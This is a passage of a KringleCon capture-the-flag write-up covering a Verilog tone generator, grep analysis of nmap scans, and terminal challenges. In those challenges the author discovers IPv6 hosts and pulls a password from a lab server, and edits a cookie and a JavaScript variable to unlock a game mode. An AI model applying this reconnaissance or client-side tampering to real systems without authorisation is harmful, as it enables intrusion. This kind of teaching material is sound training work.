    <img data-src="/images/kringlecon4/objectives/obj13_01.webp" alt="FPGA exercise" data-caption="FPGA exercise" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      FPGA exercise
      
        
        
      
    </figcaption>
  
</figure>
<p>For that, we have access to an online simulator when we have to create this tone generator to output square waves of determined frequencies: 500Hz, 1Khz, 2Khz and random values.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj13_06.webp" alt="FPGA online simulator" data-caption="FPGA online simulator" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      FPGA online simulator
      
        
        
      
    </figcaption>
  
</figure>
<p>Knowing that the <em>FPGA</em> used operates with a 125Mhz clock, the goal is to create a clock divider. One possible solution is the following <em>Verilog</em> script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-verilog" data-lang="verilog"><span class="no">`timescale</span> <span class="mh">1</span><span class="n">ns</span><span class="o">/</span><span class="mh">1</span><span class="n">ns</span>
<span class="k">module</span> <span class="n">tone_generator</span> <span class="p">(</span>
    <span class="k">input</span> <span class="n">clk</span><span class="p">,</span>
    <span class="k">input</span> <span class="n">rst</span><span class="p">,</span>
    <span class="k">input</span> <span class="p">[</span><span class="mh">31</span><span class="o">:</span><span class="mh">0</span><span class="p">]</span> <span class="n">freq</span><span class="p">,</span>
    <span class="k">output</span> <span class="n">wave_out</span>
<span class="p">);</span>
    <span class="kt">reg</span> <span class="p">[</span><span class="mh">31</span><span class="o">:</span><span class="mh">0</span><span class="p">]</span> <span class="n">counter</span><span class="p">;</span>           <span class="c1">// counter for toggling
</span><span class="c1"></span>    <span class="k">localparam</span> <span class="n">CLK_F</span> <span class="o">=</span> <span class="mh">125000000</span><span class="p">;</span> <span class="c1">// clockfreq in Hz
</span><span class="c1"></span>    <span class="kt">reg</span> <span class="n">speaker</span><span class="p">;</span>
    <span class="k">assign</span> <span class="n">wave_out</span> <span class="o">=</span> <span class="n">speaker</span><span class="p">;</span>
    
    <span class="k">always</span> <span class="p">@(</span><span class="k">posedge</span> <span class="n">clk</span> <span class="k">or</span> <span class="k">posedge</span> <span class="n">rst</span><span class="p">)</span>
    <span class="k">begin</span>
        <span class="k">if</span><span class="p">(</span><span class="n">rst</span><span class="o">==</span><span class="mh">1</span><span class="p">)</span>
            <span class="k">begin</span>
                <span class="n">counter</span> <span class="o">&lt;=</span> <span class="mh">0</span><span class="p">;</span>
                <span class="n">speaker</span> <span class="o">&lt;=</span> <span class="mh">0</span><span class="p">;</span>
            <span class="k">end</span>
        <span class="k">else</span>
            <span class="k">begin</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">counter</span> <span class="o">==</span> <span class="mh">0</span><span class="p">)</span>
                    <span class="k">begin</span>
                        <span class="n">counter</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">CLK_F</span><span class="o">/</span><span class="n">freq</span><span class="p">)</span><span class="o">*</span><span class="mh">50</span><span class="o">-</span><span class="mh">1</span><span class="p">;</span>
                        <span class="n">speaker</span> <span class="o">&lt;=</span> <span class="o">~</span><span class="n">speaker</span><span class="p">;</span>
                    <span class="k">end</span>
                <span class="k">else</span>
                    <span class="n">counter</span> <span class="o">&lt;=</span> <span class="n">counter</span> <span class="o">-</span> <span class="mh">1</span><span class="p">;</span>
            <span class="k">end</span>
    <span class="k">end</span>
<span class="k">endmodule</span>
</code></pre></td></tr></table>
</div>
</div><p>Once we validate all the checks, we can click on the <code>Program Device</code> button to build our <em>FPGA</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj13_02.webp" alt="FPGA tone generator" data-caption="FPGA tone generator" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      FPGA tone generator
      
        
        
      
    </figcaption>
  
</figure>
<p>After that, we just need to click on the toy that is on the elf table and drag &amp; drop the FPGA at the right place to validate the last objective.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj13_03.webp" alt="Speak&amp;Spell" data-caption="Speak&amp;Spell" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Speak&amp;Spell
      
        
        
      
    </figcaption>
  
</figure>
<h2 id="terminals">Terminals</h2>
<h3 id="1---exif-metadata">1 - Exif Metadata</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Piney Sappington</td>
<td>Courtyard</td>
</tr>
</tbody>
</table>
<p>We have to find which <em>DOCX</em> file has been modified by <strong>Jack Frost</strong> based on the files metadata. There are 25 files to analyze. We can use <code>exiftool</code> for that and look for the <code>Last Modified By</code> metadata.</p>
<p>We use the following one-liner to get the answer:</p>
<div class="box">$ for f in $(ls); do echo &quot;$f &quot; | tr -d '\n'; exiftool $f | grep -i &quot;last modified by&quot;; done</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi01_02.webp" alt="Terminal 1 solution" data-caption="Terminal 1 solution" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Terminal 1 solution
      
        
        
      
    </figcaption>
  
</figure>
<p>The answer is <code>2021-12-21.docx</code>.</p>
<h3 id="2---grepping-for-gold">2 - Grepping for Gold</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Greasy GopherGuts</td>
<td>The North Pole</td>
</tr>
</tbody>
</table>
<p>This chalenge is about grepping <em>NMAP</em> outputs to answer multiple questions:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi02_02.webp" alt="Terminal 2 description" data-caption="Terminal 2 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Terminal 2 description
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q1. What port does 34.76.1.22 have open?</div>
<div class="box">$ grep &quot;34.76.1.22&quot; bigscan.gnmap<br />
Host: 34.76.1.22 ()     Status: Up<br />
Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///      Ignored State: closed (999)</div>
<p>Answer: <code>62078</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q2. What port does 34.77.207.226 have open?</div>
<div class="box">$ grep &quot;34.77.207.226&quot; bigscan.gnmap   <br />
Host: 34.77.207.226 ()     Status: Up<br />
Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored State: filtered (999)</div>
<p>Answer: <code>8080</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q3. How many hosts appear &ldquo;Up&rdquo; in the scan?</div>
<div class="box">$ grep &quot;Status: Up&quot; bigscan.gnmap | wc -l<br />
26054</div>
<p>Answer: <code>26054</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q4. How many hosts have a web port open?  (Let&rsquo;s just use TCP ports 80, 443, and 8080)</div>
<div class="box">$ grep -E &quot;Ports:.*(8080/|443/|80/)&quot; bigscan.gnmap | wc -l<br />
14372</div>
<p>Answer: <code>14372</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q5. How many hosts with status Up have no (detected) open TCP ports?</div>
<p>The idea here is to find a line with <code>Status: Up</code> that does not contain the word <code>Ports</code> in the followin line.</p>
<div class="box"><p>$ grep -Pzo '(Status: Up.*\n)(?!.*Ports)' bigscan.gnmap | wc -l<br />
402</p>
<p>// or with sed magic<br />
$ sed '/Status: Up/!d;$!N;/\n.*Ports/!P;D' bigscan.gnmap | wc -l<br />
402</p>
</div>
<p>Answer: <code>402</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q6. What&rsquo;s the greatest number of <em>TCP</em> ports any one host has open?</div>
<p>The idea here is to filter all the lines containing <code>Ports</code>, split the string using comma and count the number of strings in the list.</p>
<div class="box">$ grep &quot;Ports&quot; bigscan.gnmap | awk -F',' '{print NF}' | sort -nr| uniq<br />
12<br />
11<br />
10<br />
9<br />
8<br />
7<br />
6<br />
5<br />
4<br />
3<br />
2<br />
1</div>
<p>Answer: <code>12</code>.</p>
<h3 id="3---logic-munchers">3 - Logic Munchers</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Noel Boetie</td>
<td>The North Pole</td>
</tr>
</tbody>
</table>
<p>We need to play a game called <em>Logic Chompers</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi03_02.webp" alt="Logic Chompers" data-caption="Logic Chompers" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Logic Chompers
      
        
        
      
    </figcaption>
  
</figure>
<p>The goal of the game is to select all the statements that are <em>True</em> in a 6x5 grid. We can choose between multiple difficulties and type of statements. We have to move <strong>Chompy</strong> around the grid without being touched by <em>Trollogs</em> and click <code>Space</code> on all the <em>True</em> statements. Moreover, each time a <em>Trollog</em> moves to a new position, it changes its statement. The higher the level, the more difficult the statements are and the more <em>Trollogs</em> will appear on the grid and move at a faster pace.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi03_03.webp" alt="Expert level" data-caption="Expert level" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Expert level
      
        
        
      
    </figcaption>
  
</figure>
<p>To validate this challenge, we can simply play the game normally at the <code>Intermediate</code> level and choose the <code>Potpourri</code> statement type which is a mix of all the others types.</p>
<p>Another way to play it is to analyze the <em>Websocket</em> calls that are sent and received with a proxy like <em>Burp</em>. The first call sent contains the information about the level and style we chose. The response, contains the grid configuration as well as which positions have <em>True</em> statements:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi03_04.webp" alt="Websocket call" data-caption="Websocket call" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Websocket call
      
        
        
      
    </figcaption>
  
</figure>
<p>We can then complete the levels more easily knowing the the list items go from top to bottom and from left to right.</p>
<h3 id="4---ipv6-sandbox">4 - IPv6 Sandbox</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Jewel Loggins</td>
<td>Talks Lobby</td>
</tr>
</tbody>
</table>
<p>The goal of this challenge is to retrieve a password stored in another host on an <em>IPv6</em> network. We will have to use basic tools like <code>netcat</code>, <code>nmap</code>, <code>ping</code> and <code>curl</code>.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi04_02.webp" alt="Terminal 4 description" data-caption="Terminal 4 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Terminal 4 description
      
        
        
      
    </figcaption>
  
</figure>
<p>We can start by using <code>ifconfig</code> to get the network range we are in:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi04_03.webp" alt="ifconfig" data-caption="ifconfig" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      ifconfig
      
        
        
      
    </figcaption>
  
</figure>
<p>We can find other systems in our network segment with <code>ping6 ff02::1%eth0 -c2</code>. This is the address to multicast to all nodes on a link. We can then use <code>ip neigh</code> to list the neighbour table (the <em>IPv4</em> equivalent of the <em>ARP</em> table):</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi04_04.webp" alt="Host discovery" data-caption="Host dicovery" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Host dicovery
      
        
        
      
    </figcaption>
  
</figure>
<p>We can then use <code>nmap</code> to look for open ports on those hosts. Only one has open ports (the other hosts are probably of other players):</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi04_05.webp" alt="Host open ports" data-caption="Host open ports" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Host open ports
      
        
        
      
    </figcaption>
  
</figure>
<p>We can query the webserver with <code>curl</code>. Port 80 answers as follows:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi04_06.webp" alt="Host port 80" data-caption="Host port 80" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Host port 80
      
        
        
      
    </figcaption>
  
</figure>
<p>The other port gives us the password we are looking for:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi04_07.webp" alt="Host port 9000" data-caption="Host port 9000" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Host port 9000
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="5---santas-holiday-hero">5 - Santa&rsquo;s Holiday Hero</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chimney Scissorsticks</td>
<td>Netwars</td>
</tr>
</tbody>
</table>
<p>We have to play a game called <em>Santa&rsquo;s Holiday Hero</em> that consists in pushing the right button when a music note reach the electric laser. The more musical notes you kill, the more you fuel <strong>Santa</strong>&rsquo;s sleigh. This game must be played by default with another online player.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi05_02.webp" alt="Santa&#39;s Holiday Hero" data-caption="Santa&#39;s Holiday Hero" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santa&#39;s Holiday Hero
      
        
        
      
    </figcaption>
  
</figure>
<p>However, the goal here is not to play with another player but to find a way to unlock the single player mode and win the game. We get a hint that there are 2 client-side values that we must change in order to unlock this mode and one of which is passed server-side.</p>
<p>The first thing we see is the cookie called <code>HOHOHO</code> that is equal to <code>%7B%22single_player%22%3Afalse%7D</code>. When decoded we get <code>{&quot;single_player&quot;:false}</code>. Let&rsquo;s change it to <code>{&quot;single_player&quot;:true}</code>. This is however not sufficient to launch the game. We can have a look at the <em>Javascript</em> code that runs the game. The code is found at <a href="https://hero.kringlecastle.com/assets/js/holidayhero.min.js">https://hero.kringlecastle.com/assets/js/holidayhero.min.js</a>. This is a minified version so we can use any online code beautifier to have or more readable version.</p>
<p>If we search for <code>single_player</code> we see a variable called <code>single_player_mode = !1</code>. We can set it to <code>true</code> in the browser console. Just make sure you select the iframe of the game:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi05_03.webp" alt="Single Player Mode" data-caption="Single Player Mode" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Single Player Mode
      
        
        
      
    </figcaption>
  
</figure>
<p>We see that the user <code>COMPUTER</code> joins the game. We only have now to activate <em>ON/OFF</em> swithc and play the game till the end to win:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi05_04.webp" alt="Single Player Mode win" data-caption="Single Player Mode win" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Single Player Mode win
      
